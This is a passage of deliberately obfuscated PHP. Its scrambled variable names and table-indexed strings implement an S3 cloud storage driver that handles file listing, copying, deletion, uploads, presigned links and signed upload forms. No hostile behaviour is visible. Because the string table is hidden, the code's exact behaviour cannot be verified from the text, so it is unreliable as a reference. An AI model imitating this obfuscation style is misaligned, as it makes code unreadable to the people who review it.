(array_unique($‡«»£¿Ô) as $”©©Ïó·) { $‡•ÑøËı = array($€‘ÖÛÊ[87] => $this->getPathOuter($€‘ÖÛÊ[8] . $ğ¤Ú›Â® . $€‘ÖÛÊ[8] . $”©©Ïó·), $€‘ÖÛÊ[78] => 1, $€‘ÖÛÊ[79] => 0); if (substr($”©©Ïó·, -1) != $€‘ÖÛÊ[8]) { $‡•ÑøËı[$€‘ÖÛÊ[78]] = 0; $†Şˆ™öÒ = $this->getPath($ğ¤Ú›Â® . $€‘ÖÛÊ[8] . $”©©Ïó·); if (isset($ëşîÍÓŞ[$†Şˆ™öÒ])) { $Çóğ‡µ€ = $ëşîÍÓŞ[$†Şˆ™öÒ]; if (isset($Çóğ‡µ€[$€‘ÖÛÊ[79]])) { $‡•ÑøËı[$€‘ÖÛÊ[79]] = intval($Çóğ‡µ€[$€‘ÖÛÊ[79]]); } if (isset($Çóğ‡µ€[$€‘ÖÛÊ[206]])) { $‡•ÑøËı[$€‘ÖÛÊ[88]] = intval($Çóğ‡µ€[$€‘ÖÛÊ[206]]); } } } $‹’£öÈÌ[] = $‡•ÑøËı; } return $‹’£öÈÌ; } public function slicePath($µ²Ñ’ıµ) { $ïş³–àÛ =& $_SERVER[†ûãı«°]; $ õÀ¯µş = explode($ïş³–àÛ[8], trim($µ²Ñ’ıµ, $ïş³–àÛ[8])); $Âã£¶áà = 0; do { ++$Âã£¶áà; $üûÉ¢ŞÑ[] = implode($ïş³–àÛ[8], array_slice($ õÀ¯µş, 0, $Âã£¶áà)) . $ïş³–àÛ[8]; } while ($Âã£¶áà < count($ õÀ¯µş)); $üûÉ¢ŞÑ[count($ õÀ¯µş) - 1] = $µ²Ñ’ıµ; return $üûÉ¢ŞÑ; } public function getHost() { $Àä¥®¨ =& $_SERVER[†ûãı«°]; $Ö¤áÀ“¶ = parse_url(trim($this->domain, $Àä¥®¨[8])); $Şä¹¿¼» = isset($Ö¤áÀ“¶[$Àä¥®¨[207]]) ? $Ö¤áÀ“¶[$Àä¥®¨[207]] : http_type(); $´‰£’®ô = isset($Ö¤áÀ“¶[$Àä¥®¨[208]]) ? $Ö¤áÀ“¶[$Àä¥®¨[208]] : $Ö¤áÀ“¶[$Àä¥®¨[87]]; if (isset($Ö¤áÀ“¶[$Àä¥®¨[209]])) { $´‰£’®ô .= $Àä¥®¨[4] . $Ö¤áÀ“¶[$Àä¥®¨[209]]; } return $Şä¹¿¼» . $Àä¥®¨[210] . $´‰£’®ô; } public function pathEncode($˜¨î³åÓ) { $ˆÊ»¯ì¥ =& $_SERVER[†ûãı«°]; return str_replace($ˆÊ»¯ì¥[211], $ˆÊ»¯ì¥[8], rawurlencode($˜¨î³åÓ)); } public function writeLog($®æ¿µØ = '', $Ğ‡¼ÁÊ® = false) { $Åˆ‰ßí =& $_SERVER[†ûãı«°]; $¹¨×Ø³» = in_array(ACTION, array($Åˆ‰ßí[212], $Åˆ‰ßí[213])); if (!$¹¨×Ø³» && !GLOBAL_DEBUG) { return; } $÷Íı¸óš = $®æ¿µØ; static $˜Â ›´ = null; if (!$˜Â ›´) { $˜Â ›´ = strtoupper($this->getType()); } $®æ¿µØ = $˜Â ›´ . $Åˆ‰ßí[214] . $®æ¿µØ; if ($Ğ‡¼ÁÊ®) { $â”çªŞ¾ = error_get_last(); if ($â”çªŞ¾) { $®æ¿µØ = array($®æ¿µØ, $â”çªŞ¾); } } write_log($®æ¿µØ, $Åˆ‰ßí[215]); if ($¹¨×Ø³») { throw new Exception($÷Íı¸óš); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ŠİìúÃ¤) { set_timeout(); require_once SDK_DIR . $_SERVER[†ûãı«°][216]; parent::__construct(); $this->_init($ŠİìúÃ¤); } public function _init($éÆîÍ×˜) { $¿ö·ˆá… =& $_SERVER[†ûãı«°]; $this->config = $éÆîÍ×˜; foreach ($éÆîÍ×˜ as $Šß±Üù¾ => $£ê¤±´ë) { if (isset($this->{$Šß±Üù¾})) { $this->{$Šß±Üù¾} = $£ê¤±´ë; } } $this->endpoint = $éÆîÍ×˜[$¿ö·ˆá…[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $î¿€æÊ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($î¿€æÊ, 0, 7) == $¿ö·ˆá…[218]) { $î¿€æÊ = $¿ö·ˆá…[219] . substr($î¿€æÊ, 7); } $this->client->setEndpoint($î¿€æÊ); if (in_array(ACTION, array($¿ö·ˆá…[212], $¿ö·ˆá…[213]))) { $this->client->setExceptions(); } } public function setSignVersion($Ï’¢Òî¾ = "\x76\x34") { $this->signVer = $Ï’¢Òî¾; $this->client->setSignVersion($Ï’¢Òî¾); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $òÁÁØş§) { return null; } } public function isBucketCors() { $™Ç“º¡è =& $_SERVER[†ûãı«°]; $Ëôó¬Ñ° = $this->getBucketCors(); if (!$Ëôó¬Ñ° || !is_array($Ëôó¬Ñ°)) { return !1; } if (!is_array($Ëôó¬Ñ°[$™Ç“º¡è[220]])) { $Ëôó¬Ñ°[$™Ç“º¡è[220]] = explode($™Ç“º¡è[50], $Ëôó¬Ñ°[$™Ç“º¡è[220]]); } if ($Ëôó¬Ñ°[$™Ç“º¡è[221]] != $™Ç“º¡è[222] || !in_array($™Ç“º¡è[222], $Ëôó¬Ñ°[$™Ç“º¡è[220]])) { return !1; } $Ã’Ÿ«  = array_map($™Ç“º¡è[223], $Ëôó¬Ñ°[$™Ç“º¡è[224]]); if (!is_array($Ã’Ÿ« )) { $Ã’Ÿ«  = array(); } $ƒäÆ¢«ù = array($™Ç“º¡è[225], $™Ç“º¡è[226], $™Ç“º¡è[227], $™Ç“º¡è[228], $™Ç“º¡è[229]); $–Å‡¿Û = array_diff($ƒäÆ¢«ù, $Ã’Ÿ« ); return empty($–Å‡¿Û); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($îÙí‘, $Íø¿ŠÃ = '', $ıüÒü§¡ = REPEAT_RENAME) { $şú¿íËí = $this->setContent($îÙí‘, $Íø¿ŠÃ); if ($şú¿íËí !== !1) { return $this->getPathOuter($îÙí‘); } return !1; } public function mkdir($í õŒ¢æ, $°ô­´­é = REPEAT_SKIP) { $ïÕÈÜ =& $_SERVER[†ûãı«°]; if (empty($í õŒ¢æ) && $í õŒ¢æ !== $ïÕÈÜ[230]) { return !1; } if ($°ô­´­é && $this->_isFolder($í õŒ¢æ)) { return $this->getPathOuter($í õŒ¢æ); } $Ò´Ò—²Ã = $this->setContent($í õŒ¢æ, $ïÕÈÜ[12], !0); if ($Ò´Ò—²Ã !== !1) { return $this->getPathOuter($í õŒ¢æ); } return !1; } public function copyFile($åâ´—ò€, $¯À´ê—ë, $Ò ‡ì»  = array()) { $ÂµôÈĞ• =& $_SERVER[†ûãı«°]; $ÈÉõ¼ßÃ = $this->objectMeta($åâ´—ò€); if (!$ÈÉõ¼ßÃ) { return !1; } if ($ÈÉõ¼ßÃ[$ÂµôÈĞ•[79]] <= 1024 * 1024 * 200) { $¦Øó“Ÿø = $this->client->copyObject($this->bucket, $åâ´—ò€, $this->bucket, $¯À´ê—ë, $ÂµôÈĞ•[231], $Ò ‡ì» ); } else { $¦Øó“Ÿø = $this->client->multiCopyObject($this->bucket, $åâ´—ò€, $this->bucket, $¯À´ê—ë, $Ò ‡ì» ); } $¦Øó“Ÿø = $¦Øó“Ÿø ? $this->getPathOuter($¯À´ê—ë) : !1; return $¦Øó“Ÿø; } public function moveFile($åÒèõÇ¹, $ª”‰ÄêÑ) { if ($this->copyFile($åÒèõÇ¹, $ª”‰ÄêÑ)) { $this->delFile($åÒèõÇ¹); return $this->getPathOuter($ª”‰ÄêÑ); } return !1; } public function delFile($ŸÜ‡ËŞÂ) { return $this->client->deleteObject($this->bucket, $ŸÜ‡ËŞÂ); } public function delFolder($í¾İ‰’ï) { $Æ¤”Ø‚ =& $_SERVER[†ûãı«°]; if (!$this->exist($í¾İ‰’ï)) { return !0; } $this->listItemCache = !1; $˜âš‡—Ù = $this->fileList($í¾İ‰’ï); $this->listItemCache = !0; $Ó×¦‘ü = trim($í¾İ‰’ï, $Æ¤”Ø‚[8]) . $Æ¤”Ø‚[8]; if (!empty($í¾İ‰’ï) && $í¾İ‰’ï !== $Æ¤”Ø‚[230] && !in_array($Ó×¦‘ü, $˜âš‡—Ù[$Æ¤”Ø‚[85]])) { $˜âš‡—Ù[$Æ¤”Ø‚[85]][] = $Ó×¦‘ü; } $ŠÙÔ£˜ = $this->delByBatch($˜âš‡—Ù[$Æ¤”Ø‚[86]]); if (!$ŠÙÔ£˜) { return !1; } $ŠÙÔ£˜ = $this->delByBatch($˜âš‡—Ù[$Æ¤”Ø‚[85]]); if (!$ŠÙÔ£˜) { return !1; } return $this->delFile($Ó×¦‘ü); } private function delByBatch($ğúÈŠùÒ) { foreach (array_chunk($ğúÈŠùÒ, 1000) as $„Ë±­³ğ) { $æªº¶˜¥ = $this->client->deleteObjects($this->bucket, $„Ë±­³ğ); if (!$æªº¶˜¥) { return !1; } } return !0; } public function rename($š¹éâà£, $ú×§šğ) { return $this->renameObject($š¹éâà£, $ú×§šğ); } public function listPath($¯«íô†ã, $÷Œ­Ææ = false) { $Ÿêûö¸Œ =& $_SERVER[†ûãı«°]; $œ¬‰Ó©† = $this->fileList($¯«íô†ã, $Ÿêûö¸Œ[8], !0); foreach ($œ¬‰Ó©†[$Ÿêûö¸Œ[85]] as $ªú¹åé => $­¥İñ¢æ) { $œ¬‰Ó©†[$Ÿêûö¸Œ[85]][$ªú¹åé] = $this->folderInfo($­¥İñ¢æ, $÷Œ­Ææ, $­¥İñ¢æ); } foreach ($œ¬‰Ó©†[$Ÿêûö¸Œ[86]] as $ªú¹åé => $­¥İñ¢æ) { $œ¬‰Ó©†[$Ÿêûö¸Œ[86]][$ªú¹åé] = $this->fileInfo($­¥İñ¢æ[$Ÿêûö¸Œ[32]], $÷Œ­Ææ, $­¥İñ¢æ); } return $œ¬‰Ó©†; } protected function infoChildren($­üÒƒÎ¨, &$¬ë¯Ñ«ä) { $¨³­§Ò€ =& $_SERVER[†ûãı«°]; $†µ’³Ã² = $this->fileList($­üÒƒÎ¨, $¨³­§Ò€[12], !0); $¬ë¯Ñ«ä[$¨³­§Ò€[81]] += count($†µ’³Ã²[$¨³­§Ò€[85]]); $¬ë¯Ñ«ä[$¨³­§Ò€[80]] += count($†µ’³Ã²[$¨³­§Ò€[86]]); foreach ($†µ’³Ã²[$¨³­§Ò€[86]] as $Éèì‹Úì) { if (!$Éèì‹Úì || !$Éèì‹Úì[$¨³­§Ò€[79]]) { continue; } $¬ë¯Ñ«ä[$¨³­§Ò€[79]] += $Éèì‹Úì[$¨³­§Ò€[79]]; } } private function fileInfo($³»äŠñ, $‰¦çÀ¼ù = false, $ ¯Ëí¾… = array()) { $—¤¾°¯‹ =& $_SERVER[†ûãı«°]; $Êà¸°¤ = array($—¤¾°¯‹[32] => $this->pathThis($³»äŠñ), $—¤¾°¯‹[87] => $this->getPathOuter($³»äŠñ), $—¤¾°¯‹[33] => $—¤¾°¯‹[232], $—¤¾°¯‹[169] => $this->ext($³»äŠñ), $—¤¾°¯‹[79] => isset($ ¯Ëí¾…[$—¤¾°¯‹[79]]) ? $ ¯Ëí¾…[$—¤¾°¯‹[79]] : 0); if ($‰¦çÀ¼ù) { return $Êà¸°¤; } $Êà¸°¤[$—¤¾°¯‹[233]] = $Êà¸°¤[$—¤¾°¯‹[88]] = 0; $Êà¸°¤[$—¤¾°¯‹[234]] = $Êà¸°¤[$—¤¾°¯‹[235]] = !0; if (empty($ ¯Ëí¾…)) { $ ¯Ëí¾… = $this->objectMeta($³»äŠñ); if (!$ ¯Ëí¾…) { return $Êà¸°¤; } } if (isset($ ¯Ëí¾…[$—¤¾°¯‹[236]]) && $ ¯Ëí¾…[$—¤¾°¯‹[236]]) { $Êà¸°¤[$—¤¾°¯‹[237]] = $ ¯Ëí¾…[$—¤¾°¯‹[236]]; } if (isset($ ¯Ëí¾…[$—¤¾°¯‹[206]])) { $Êà¸°¤[$—¤¾°¯‹[88]] = $ ¯Ëí¾…[$—¤¾°¯‹[206]]; } if (isset($ ¯Ëí¾…[$—¤¾°¯‹[79]])) { $Êà¸°¤[$—¤¾°¯‹[79]] = $ ¯Ëí¾…[$—¤¾°¯‹[79]]; } return $Êà¸°¤; } private function folderInfo($Ò…¼£§æ, $Ääúø’à = false, $ıÊô¼’ú = array()) { $ñ‘İó­ =& $_SERVER[†ûãı«°]; $©‹µÛˆç = array($ñ‘İó­[32] => $this->pathThis($Ò…¼£§æ), $ñ‘İó­[87] => $this->getPathOuter($ñ‘İó­[8] . $Ò…¼£§æ), $ñ‘İó­[33] => $ñ‘İó­[78]); if ($Ääúø’à) { return $©‹µÛˆç; } $©‹µÛˆç[$ñ‘İó­[233]] = $©‹µÛˆç[$ñ‘İó­[88]] = 0; $©‹µÛˆç[$ñ‘İó­[234]] = $©‹µÛˆç[$ñ‘İó­[235]] = !0; if ($Ò…¼£§æ == $ñ‘İó­[12]) { return $©‹µÛˆç; } if (empty($ıÊô¼’ú)) { $ıÊô¼’ú = $this->objectMeta(trim($Ò…¼£§æ, $ñ‘İó­[8]) . $ñ‘İó­[8]); } if (isset($ıÊô¼’ú[$ñ‘İó­[206]])) { $©‹µÛˆç[$ñ‘İó­[233]] = $ıÊô¼’ú[$ñ‘İó­[206]]; } return $©‹µÛˆç; } private function fileList($âô®´³¾, $Ñöóã„Ï = '', $¸ÇÏ½š = 0) { $€ÃÜ±Ó =& $_SERVER[†ûãı«°]; $¹ñ®ó‡æ = rtrim($âô®´³¾, $€ÃÜ±Ó[8]) . $€ÃÜ±Ó[8]; $¢Ï“°É¼ = $this->listObjs($¹ñ®ó‡æ, null, null, $Ñöóã„Ï); if (!$¢Ï“°É¼) { return array($€ÃÜ±Ó[85] => array(), $€ÃÜ±Ó[86] => array()); } $¹Â£×Ù´ = $ü˜‚¯é = array(); foreach ($¢Ï“°É¼[$€ÃÜ±Ó[238]] as $–º›ˆ·) { $­Ì«‡ïÈ = $–º›ˆ·[$€ÃÜ±Ó[32]]; if ($­Ì«‡ïÈ == $¹ñ®ó‡æ) { continue; } $âú‰ç¥ô = isset($–º›ˆ·[$€ÃÜ±Ó[79]]) ? $–º›ˆ·[$€ÃÜ±Ó[79]] : 0; $€û€ê«“ = $âú‰ç¥ô == 0 && substr($­Ì«‡ïÈ, strlen($­Ì«‡ïÈ) - 1, 1) == $€ÃÜ±Ó[8] ? !0 : !1; $this->cacheMethodInfoSet($­Ì«‡ïÈ, $€û€ê«“, $–º›ˆ·); if ($€û€ê«“) { $¹Â£×Ù´[] = $­Ì«‡ïÈ; continue; } $ü˜‚¯é[] = $¸ÇÏ½š ? $–º›ˆ· : $­Ì«‡ïÈ; } foreach ($¢Ï“°É¼[$€ÃÜ±Ó[239]] as $–º›ˆ·) { $¹Â£×Ù´[] = $–º›ˆ·[$€ÃÜ±Ó[32]]; $this->cacheMethodInfoSet($–º›ˆ·[$€ÃÜ±Ó[32]], !0); } $this->cacheMethodInfoSet($âô®´³¾, !0); return array($€ÃÜ±Ó[85] => $¹Â£×Ù´, $€ÃÜ±Ó[86] => $ü˜‚¯é); } private function listObjs($³é¦‡ÃÄ, $›ÀÓ»­ = null, $ß°Çæƒ  = null, $º½× œü = null) { $ñæ’…–Ì =& $_SERVER[†ûãı«°]; $³é¦‡ÃÄ = trim($³é¦‡ÃÄ, $ñæ’…–Ì[8]); $ªô¾Ğí = empty($³é¦‡ÃÄ) && $³é¦‡ÃÄ !== $ñæ’…–Ì[230] ? $ñæ’…–Ì[12] : $³é¦‡ÃÄ . $ñæ’…–Ì[8]; return $this->client->getBucket($this->bucket, $ªô¾Ğí, $›ÀÓ»­, $ß°Çæƒ , $º½× œü, !0); } public function has($¤¨¶ƒ¹œ, $áÇĞìğ = false, $ñ™ğúá = true) { $£è™ëÒ =& $_SERVER[†ûãı«°]; $¤¨¶ƒ¹œ = trim($¤¨¶ƒ¹œ, $£è™ëÒ[8]); $òÔñ°º = empty($¤¨¶ƒ¹œ) && $¤¨¶ƒ¹œ !== $£è™ëÒ[230] ? $£è™ëÒ[12] : $¤¨¶ƒ¹œ . $£è™ëÒ[8]; $»ÈøšÃ = null; $İáĞ÷èü = 500; $ƒĞëú‹‘ = $£è™ëÒ[8]; $Ü£ä°Ôú = $ı½Û”ÅÒ = array(); while (!0) { $ş±Õòñ = $this->listObjs($¤¨¶ƒ¹œ, $»ÈøšÃ, $İáĞ÷èü, $ƒĞëú‹‘); if (!$ş±Õòñ) { break; } $»ÈøšÃ = $ş±Õòñ[$£è™ëÒ[240]]; $š‹ôØ» = $ş±Õòñ[$£è™ëÒ[238]]; $ÑÜ’„”û = $ş±Õòñ[$£è™ëÒ[239]]; if (empty($š‹ôØ») && empty($ÑÜ’„”û)) { break; } if (count($š‹ôØ») == 1 && $š‹ôØ»[0][$£è™ëÒ[32]] == $òÔñ°º) { break; } if ($áÇĞìğ) { if (count($š‹ôØ»)) { $š‹ôØ» = array_column($š‹ôØ», $£è™ëÒ[32]); $Ü£ä°Ôú = array_merge($Ü£ä°Ôú, $š‹ôØ»); } if (count($ÑÜ’„”û)) { $ÑÜ’„”û = array_column($ÑÜ’„”û, $£è™ëÒ[32]); $ı½Û”ÅÒ = array_merge($ı½Û”ÅÒ, $ÑÜ’„”û); } if ($»ÈøšÃ === null) { break; } continue; } if ($ñ™ğúá) { if (!empty($š‹ôØ»)) { if (count($š‹ôØ») > 1 || isset($š‹ôØ»[0][$£è™ëÒ[32]]) && $š‹ôØ»[0][$£è™ëÒ[32]] != $òÔñ°º) { return !0; } } } else { if (!empty($ÑÜ’„”û)) { return !0; } } if ($»ÈøšÃ === null) { break; } } if ($áÇĞìğ) { $Ü£ä°Ôú = array_diff($Ü£ä°Ôú, array($òÔñ°º)); $Ü£ä°Ôú = count(array_unique($Ü£ä°Ôú)); $ı½Û”ÅÒ = count(array_unique($ı½Û”ÅÒ)); return array($£è™ëÒ[241] => $Ü£ä°Ôú, $£è™ëÒ[242] => $ı½Û”ÅÒ); } return !1; } public function listAll($±íùÁËã) { $˜ÎÒüÎ¹ =& $_SERVER[†ûãı«°]; $ú’¶Ü¹• = $this->fileList($±íùÁËã, $˜ÎÒüÎ¹[12], !0); $Ë­ÀöÕ° = array_to_keyvalue($ú’¶Ü¹•[$˜ÎÒüÎ¹[86]], $˜ÎÒüÎ¹[32]); foreach ($ú’¶Ü¹•[$˜ÎÒüÎ¹[85]] as $ª‡Œ¡éï) { if (is_string($ª‡Œ¡éï)) { $Ë­ÀöÕ°[$ª‡Œ¡éï] = array($˜ÎÒüÎ¹[79] => 0); } } return $this->listAllFiles($±íùÁËã, $Ë­ÀöÕ°); } public function canRead($íîœÍÄÃ) { $ñ¯¦² ¢ =& $_SERVER[†ûãı«°]; $÷•™ã€ş = $this->client->getAccessControlPolicy($this->bucket, $íîœÍÄÃ); if (!$÷•™ã€ş) { return !1; } return in_array($÷•™ã€ş, array($ñ¯¦² ¢[243], $ñ¯¦² ¢[244], $ñ¯¦² ¢[245])) ? !0 : !1; } public function canWrite($Í¡üƒ½ ) { $¦‚ Ôğı =& $_SERVER[†ûãı«°]; $»ïËœ¢¢ = $this->client->getAccessControlPolicy($this->bucket, $Í¡üƒ½ ); if (!$»ïËœ¢¢) { return !1; } return in_array($»ïËœ¢¢, array($¦‚ Ôğı[243], $¦‚ Ôğı[244])) ? !0 : !1; } public function getContent($¡É¦‚„ñ) { return $this->client->getObject($this->bucket, $¡É¦‚„ñ); } public function setContent($ë³Áä”, $›ıÁÂà = '', $»‡Å™ûî = false) { $‹úå•Äà =& $_SERVER[†ûãı«°]; $ë³Áä” = $»‡Å™ûî ? trim($ë³Áä”, $‹úå•Äà[8]) . $‹úå•Äà[8] : $ë³Áä”; $ˆÓ¡àÇİ = get_file_mime(get_path_ext($ë³Áä”)); $ıí”±ƒ = $this->client->putObject($›ıÁÂà, $this->bucket, $ë³Áä”, $‹úå•Äà[231], array(), $ˆÓ¡àÇİ); if (!$ıí”±ƒ) { return !1; } if ($»‡Å™ûî) { return !0; } return $ıí”±ƒ ? !0 : !1; } public function fileSubstr($¡Ö¡àÀË, $¦¶ú¥ÁÚ, $©ôÎ€ÉÅ) { $©ğåø‘ø = $¦¶ú¥ÁÚ + $©ôÎ€ÉÅ - 1; return $this->client->getObject($this->bucket, $¡Ö¡àÀË, array($_SERVER[†ûãı«°][246] => "\142\171\x74\x65\163\x3d{$¦¶ú¥ÁÚ}\x2d{$©ğåø‘ø}")); } public function upload($Æ…ğê€, $Ë›ıé¾Ú, $—‚ÕÁñ = false, $¨ÚØØ—Ç = REPEAT_REPLACE) { $É™«ÉÑÀ =& $_SERVER[†ûãı«°]; $ÁŒæÆì = array($É™«ÉÑÀ[247] => @md5_file($Ë›ıé¾Ú)); $ù­Ø‰¾ = array($É™«ÉÑÀ[248] => get_file_mime(get_path_ext($Æ…ğê€))); if (IO::size($Ë›ıé¾Ú) <= 1024 * 1024 * 200) { $ÙâìŠ’Å = $this->client->putObjectFile($Ë›ıé¾Ú, $this->bucket, $Æ…ğê€, $É™«ÉÑÀ[231], $ÁŒæÆì, $ù­Ø‰¾); return !empty($ÙâìŠ’Å) ? $this->getPathOuter($Æ…ğê€) : !1; } $ÜğıÎÓ = $this->client->multiUploadObject($Ë›ıé¾Ú, $this->bucket, trim($Æ…ğê€, $É™«ÉÑÀ[8]), $ÁŒæÆì, $ù­Ø‰¾); return $ÜğıÎÓ ? $this->getPathOuter($Æ…ğê€) : !1; } public function download($Ò¯ÁËœ“, $È»‚çıš) { if (!@is_dir($this->pathFather($È»‚çıš)) && !IO::mkdir($this->pathFather($È»‚çıš))) { return !1; } $ñ¥ü•ÔÁ = $this->client->getObject($this->bucket, $Ò¯ÁËœ“, array(), $È»‚çıš); return $ñ¥ü•ÔÁ !== !1 ? $È»‚çıš : !1; } public function link($‹ºüçÂ, $Ú…§æë³ = array()) { return $this->getPreSignedURL($‹ºüçÂ, 3600 * 12, $Ú…§æë³); } private function getPreSignedURL($„‚ÄÊ‡ø, $¼ÕÈÕ§¹, $üËòñÍ = array(), $ñÍæ¥ï­ = "\x47\105\124") { $·Çéğ•‰ =& $_SERVER[†ûãı«°]; $„‚ÄÊ‡ø = trim($„‚ÄÊ‡ø, $·Çéğ•‰[8]); if ($this->signVer == $·Çéğ•‰[249]) { return $this->client->getPreSignedV2URL($this->bucket, $„‚ÄÊ‡ø, $¼ÕÈÕ§¹, $ñÍæ¥ï­, $üËòñÍ); } return $this->client->getPreSignedV4URL($this->bucket, $„‚ÄÊ‡ø, $¼ÕÈÕ§¹, array(), $ñÍæ¥ï­, $üËòñÍ); } public function fileOut($œïÖ¼ ò, $¥è¦«ÊÌ = false, $Ïâêú¥¾ = false, $ùäÇ¨ªò = '') { $ƒ­Ö¼Ò =& $_SERVER[†ûãı«°]; if ($this->isFileOutServer()) { return $this->fileOutServer($œïÖ¼ ò, $¥è¦«ÊÌ, $Ïâêú¥¾, $ùäÇ¨ªò); } if (!$Ïâêú¥¾) { $Ïâêú¥¾ = $this->pathThis($œïÖ¼ ò); } $÷Çê²‚Ô = get_file_mime(get_path_ext($Ïâêú¥¾)); if ($÷Çê²‚Ô == $ƒ­Ö¼Ò[250]) { return parent::fileOut($œïÖ¼ ò, $¥è¦«ÊÌ, $Ïâêú¥¾, $ùäÇ¨ªò); } $°À›×’ = array($ƒ­Ö¼Ò[251] => $÷Çê²‚Ô); if ($¥è¦«ÊÌ) { $°À›×’[$ƒ­Ö¼Ò[252]] = $ƒ­Ö¼Ò[253] . rawurlencode($Ïâêú¥¾); } else { } $ç°¼äÀ = $this->link($œïÖ¼ ò, $°À›×’); $this->fileOutLink($ç°¼äÀ); } public function fileOutServer($ØçŒùÎå, $®Óğ‹àì = false, $“ƒ‰ğ = false, $êÅÛ¥† = '') { parent::fileOut($ØçŒùÎå, $®Óğ‹àì, $“ƒ‰ğ, $êÅÛ¥†); } public function fileOutImageServer($ä¤ÖÅ¯õ, $ƒ»Ÿ¾ã– = 250) { parent::fileOutImage($ä¤ÖÅ¯õ, $ƒ»Ÿ¾ã–); } public function hashMd5($ÍÒ Ò’Ò, $©¶àá­Š = '') { $ªúıçõ÷ = $this->objectMeta($ÍÒ Ò’Ò); if (!$ªúıçõ÷) { return !1; } $©¶àá­Š = $©¶àá­Š ? $©¶àá­Š : _get($ªúıçõ÷, $_SERVER[†ûãı«°][254]); return $©¶àá­Š; } public function uploadFormData($ˆá±„ËÆ, $¤„¢ĞÎŞ = 3600) { $€Ä«Åá– =& $_SERVER[†ûãı«°]; if (!$this->_isClientAsync()) { $òÜ‡î¢ = $this->getPreSignedURL($ˆá±„ËÆ, $¤„¢ĞÎŞ, array(), $€Ä«Åá–[255]); return array($€Ä«Åá–[208] => str_replace($€Ä«Åá–[218], $€Ä«Åá–[256], $òÜ‡î¢)); } if (isset($GLOBALS[$€Ä«Åá–[6]][$€Ä«Åá–[92]][$€Ä«Åá–[257]]) && $GLOBALS[$€Ä«Åá–[6]][$€Ä«Åá–[92]][$€Ä«Åá–[257]] == $€Ä«Åá–[230]) { return $this->uploadMultiData($ˆá±„ËÆ, $¤„¢ĞÎŞ); } if ($this->signVer == $€Ä«Åá–[249]) { return $this->uploadFormDataV2($ˆá±„ËÆ, $¤„¢ĞÎŞ); } return $this->uploadFormDataV4($ˆá±„ËÆ, $¤„¢ĞÎŞ); } public function uploadFormDataV2($£…àáÊü, $ß•šï‘‚ = 3600) { $š‘ÁÀªÀ =& $_SERVER[†ûãı«°]; $Ñ¸¦ÌÍ¤ = $this->pathFather($£…àáÊü); $ŠüÕš…ê = $this->client->getHttpUploadPostParams($this->bucket, $Ñ¸¦ÌÍ¤, $š‘ÁÀªÀ[231], $ß•šï‘‚); $À”“¨Ùâ = array_merge((array) $ŠüÕš…ê, array($š‘ÁÀªÀ[258] => $š‘ÁÀªÀ[249], $š‘ÁÀªÀ[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($À”“¨Ùâ[$š‘ÁÀªÀ[258]]); } return $À”“¨Ùâ; } public function uploadFormDataV4($±Ê¤ÎÉ², $¡û›ôÆŠ = 3600) { $Ö’È¦ş‰ =& $_SERVER[†ûãı«°]; $áüŠƒé¦ = $Ö’È¦ş‰[231]; $æŠ¢ëò¤ = $Ö’È¦ş‰[259]; $Ş½ñÍ … = $Ö’È¦ş‰[62]; $àøÂ•öı = gmdate($Ö’È¦ş‰[260]); $±·Ÿµ…‘ = gmdate($Ö’È¦ş‰[261]); $ãÉÈÅÜò = $Ö’È¦ş‰[262]; $î¦ˆØĞ = $¡û›ôÆŠ . $Ö’È¦ş‰[12]; $Ğ–ÛÈ˜Å = $Ö’È¦ş‰[263]; $†òŞâÑ = array($this->accessKey, $±·Ÿµ…‘, $this->region, $Ş½ñÍ …, $ãÉÈÅÜò); $Ãú¹¹Ç = implode($Ö’È¦ş‰[8], $†òŞâÑ); $ãœ½È‘¬ = array($Ö’È¦ş‰[264] => gmdate($Ö’È¦ş‰[265], strtotime($Ö’È¦ş‰[266])), $Ö’È¦ş‰[267] => array(array($Ö’È¦ş‰[268] => $this->bucket), array($Ö’È¦ş‰[269], $Ö’È¦ş‰[270], $Ö’È¦ş‰[12]), array($Ö’È¦ş‰[269], $Ö’È¦ş‰[271], $Ö’È¦ş‰[12]), array($Ö’È¦ş‰[272] => $Ğ–ÛÈ˜Å), array($Ö’È¦ş‰[273] => $Ãú¹¹Ç), array($Ö’È¦ş‰[274] => $æŠ¢ëò¤), array($Ö’È¦ş‰[275] => $àøÂ•öı), array($Ö’È¦ş‰[276] => $î¦ˆØĞ))); $€Š‰Íî… = base64_encode(json_encode($ãœ½È‘¬)); $ôëàƒº¹ = hash_hmac($Ö’È¦ş‰[277], $±·Ÿµ…‘, $Ö’È¦ş‰[278] . $this->secret, !0); $ó»Ø“ù = hash_hmac($Ö’È¦ş‰[277], $this->region, $ôëàƒº¹, !0); $¹É¢¹»¹ = hash_hmac($Ö’È¦ş‰[277], $Ş½ñÍ …, $ó»Ø“ù, !0); $äÉÒ‡½õ = hash_hmac($Ö’È¦ş‰[277], $ãÉÈÅÜò, $¹É¢¹»¹, !0); $ƒØ¯‹· = hash_hmac($Ö’È¦ş‰[277], $€Š‰Íî…, $äÉÒ‡½õ); $íõÃ€ = array($Ö’È¦ş‰[248] => $Ö’È¦ş‰[12], $Ö’È¦ş‰[272] => $Ğ–ÛÈ˜Å, $Ö’È¦ş‰[279] => $€Š‰Íî…, $Ö’È¦ş‰[273] => $Ãú¹¹Ç, $Ö’È¦ş‰[274] => $æŠ¢ëò¤, $Ö’È¦ş‰[275] => $àøÂ•öı, $Ö’È¦ş‰[276] => $î¦ˆØĞ, $Ö’È¦ş‰[280] => $ƒØ¯‹·, $Ö’È¦ş‰[258] => $Ö’È¦ş‰[249], $Ö’È¦ş‰[208] => $this->getHost()); if ($this->_isClientAsync()) { unset($íõÃ€[$Ö’È¦ş‰[258]]); } return $íõÃ€; } public function uploadMultiData($¿¼ÅóÏŠ, $·³‘ËÅ® = 3600) { $¼—ö‡ãÕ =& $_SERVER[†ûãı«°]; $ä»Íü®÷ = $this->signVer == $¼—ö‡ãÕ[249] ? 